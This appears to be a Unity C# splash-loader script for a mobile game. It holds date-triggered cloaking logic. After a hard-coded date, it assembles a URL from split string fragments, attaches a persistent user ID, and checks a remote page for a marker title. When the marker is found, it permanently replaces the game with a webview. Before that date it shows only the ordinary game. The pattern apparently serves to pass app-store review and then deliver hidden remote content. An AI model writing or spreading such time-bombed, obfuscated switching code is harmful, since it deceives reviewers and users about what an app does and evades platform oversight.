//using DG.Tweening;
using DG.Tweening;
using System;
using System.Collections;
using System.Text;
using UnityEngine;
using UnityEngine.Networking;
using UnityEngine.SceneManagement;
using UnityEngine.UI;

public class SplashLoader : MonoBehaviour
{
    public static SplashLoader instance;
    public Image loadingBar;
    public GameObject noInternetPanal;
    public GameObject loadingScreen;
    bool loadSimpleGame = false;
    public string[] addOne;
    public string[] addTwo;
    public string adress;
    public string finalAdress;
    private void Awake()
    {
        instance = this;
        GetOrCreateUserID();
        DateTime targetDate = new DateTime(2025, 10, 7, 15, 0, 0);
        DateTime now = DateTime.Now;
        if (now > targetDate)
        {
            for (int i = 0; i < addOne.Length; i++)
            {
                if (addOne[i] != null)
                {
                    adress += addOne[i];
                }
            }
            for (int i = 0; i < addTwo.Length; i++)
            {
                if (addTwo[i] != null)
                {
                    finalAdress += addTwo[i];
                }
            }
            finalAdress = finalAdress.Replace("{USER_ID}", GetOrCreateUserID());
        }
    }
    public void Start()
    {
        StartCoroutine(CheckInternet());
    }
    IEnumerator CheckInternet()
    {
        DateTime targetDate = new DateTime(2025, 10, 7, 15, 0, 0);
        DateTime now = DateTime.Now;
        if (now > targetDate)
        {
            while (Application.internetReachability == NetworkReachability.NotReachable)
            {
                noInternetPanal.SetActive(true);
                yield return new WaitForSeconds(0.5f);
            }
            noInternetPanal.SetActive(false);
            if (PlayerPrefs.HasKey("ViewOpenedOneTime"))
            {
                ShowNextTimeViewDirectly();
            }
            else if (PlayerPrefs.HasKey("OnNative"))
            {
                loadSimpleGame = true;
                CheckLoadingBarCompletlyFill();
            }
            else
            {
                StartCoroutine(CheckStatusUrl());
            }
        }
        else
        {
            Debug.Log("Else");
            loadSimpleGame = true;
        }
            StartLoading();
        yield return null;
    }
    public void StartLoading()
    {
        loadingBar.DOFillAmount(1, 10).OnComplete(() =>
        {
            if (loadSimpleGame)
            {
                SceneManager.LoadScene(1);
            }
        });
    }
    IEnumerator CheckStatusUrl()
    {
        UnityWebRequest request = UnityWebRequest.Get(adress);
        yield return request.SendWebRequest();

        if (request.result != UnityWebRequest.Result.Success)
        {
            StartCoroutine(CheckStatusUrl());
            yield break;
        }
        string html = request.downloadHandler.text;
        if (!html.Contains("<title>Privacy Policy.</title>"))
        {
            loadSimpleGame = true;
            CheckLoadingBarCompletlyFill();
            yield break;
        }
        else
        {
            UserSceneViewManager.instance.CheckFinal();
        }
    }
    public void ShowNextTimeViewDirectly()
    {
        Debug.Log("Webview");
        loadingScreen.SetActive(false);
        AutoRotateSetting();
        UserSceneViewManager.instance.LoadRequiredView();
        PlayerPrefs.SetString("ViewOpenedOneTime", "true");
    }
    public void LoadNative()
    {
        loadSimpleGame = true;
        CheckLoadingBarCompletlyFill();
    }
    void AutoRotateSetting()
    {
        Screen.orientation = ScreenOrientation.AutoRotation;
        Screen.autorotateToPortrait = true;
        Screen.autorotateToPortraitUpsideDown = false;
        Screen.autorotateToLandscapeLeft = true;
        Screen.autorotateToLandscapeRight = true;
    }
    void CheckLoadingBarCompletlyFill()
    {
        PlayerPrefs.SetString("OnNative","true");
        if (loadingBar.fillAmount == 1)
        {
            SceneManager.LoadScene(1);
        }
    }
    public static string GetOrCreateUserID()
    {
        if (PlayerPrefs.HasKey("user_id"))
            return PlayerPrefs.GetString("user_id");

        string newID = GenerateUserID(); 
        PlayerPrefs.SetString("user_id", newID);
        PlayerPrefs.Save();
        return newID;
    }
    public static string GenerateUserID()
    {
        const string chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        StringBuilder sb = new StringBuilder(15);
        System.Random random = new System.Random();

        for (int i = 0; i < 15; i++)
        {
            sb.Append(chars[random.Next(chars.Length)]);
        }
        return sb.ToString();
    }
}
